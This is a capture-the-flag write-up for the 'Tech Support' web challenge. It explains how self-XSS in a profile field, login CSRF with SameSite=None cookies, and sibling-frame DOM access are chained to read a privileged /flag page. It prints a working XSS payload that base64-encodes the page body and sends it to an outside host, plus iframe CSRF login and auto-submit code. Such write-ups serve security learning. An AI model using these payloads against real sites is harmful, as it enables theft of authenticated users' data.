# TECH SUPPORT - 90 solves

## Story

Try chatting with tech support about getting a flag.


## Solution

The challenge has 8 routes: 
* `/`
* `/me`
* `/flag`
* `/logout`
* `/login`
* `/about`
* `/chat`
* `/register`

Flag is at `/flag` route and only the chat support user has access to the flag. 

### Part 1 - XSS in chat window

There is chat functionality on website that lets you to chat with support user. To start chat you can request chat with a reason and the reason request is vulnerable to xss.

However the XSS will trigger on an iframe which is on another domain `typeselfsub-support.web.ctfcompetition.com` and we are unable to access parent window directly due to [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

### Part 2 - SELF XSS in `/me` route

We can set address for our profile and it's also vulnerable to XSS. However we are not sure if admin has this functionality or not.


### Part 3 - CSRF in `/login` route

There are no csrf protection in `/login` route so we can login anybody to our controlled accout with CSRF.

> Session cookies same-site attribute is set to `none` So we can easily perform CSRF.

### Part 4 - The fact about frames

Consider this situation, `website-1` opens 2 frames to `website-2`. The html code would be something like this:

```html
<!-- website-1 -->
<body>
    <iframe src="//site2.com/page1.html"> 
    </iframe>
    <iframe src="//site2.com/page2.html"> 
    </iframe>
</body>
```

now in `//site2.com/page2.html` we can access `//site2.com/page1.html` dom with this code:

```html
<body>
<script>
let dom = window.top.frames[0].document
</script>
</body>
```

###  Part 5 - Chainging all together

I used [webhook.site](https://webhook.site) which is free to host my payload but you can solve this without hosting the payload anywhere but you will need to do some changes to payload.

First we need to put a xss payload in our profile page that steals flag page's body. I used this:

`<script>fetch('https://yourwebsite/?a='+encodeURIComponent(btoa(FLAGFRAME.document.body.innerHTML)))</script>`

In my payload, the `FLAGFRAME` is `top.frames[0].frames[0].frames[0]`

Now we have to construct our payload.
First we open frame to flag so we can access to it later.

```html
<iframe id="flag" src="https://typeselfsub.web.ctfcompetition.com/flag">
</iframe> 
```
Then we open frame to perform CSRF to login with our login credentials.
```html
<iframe id="login" srcdoc='
 <form action="https://typeselfsub.web.ctfcompetition.com/login" name="fa" method="POST"> 
  <input name="username" value="USERNAME"> 
  <input name="password" value="PASSWORD"> 
  <input name="csrf">
 </form> 
'>
</iframe> 
```
And finally the JS
```
<script> 
flag.onload=function(){
    login.contentWindow.document.forms[0].submit();  
}      
</script> 
```

You can find final payload at `index.html`

### Part 6 - Get flag

To get the flag, We send iframe to embed our payload.

```
<iframe src="//hosting.com/payload_index.html">
</iframe>
```

Then you will receive flag page's body in base64 format.


> Flag: CTF{self-xss?-that-isn't-a-problem-right...}
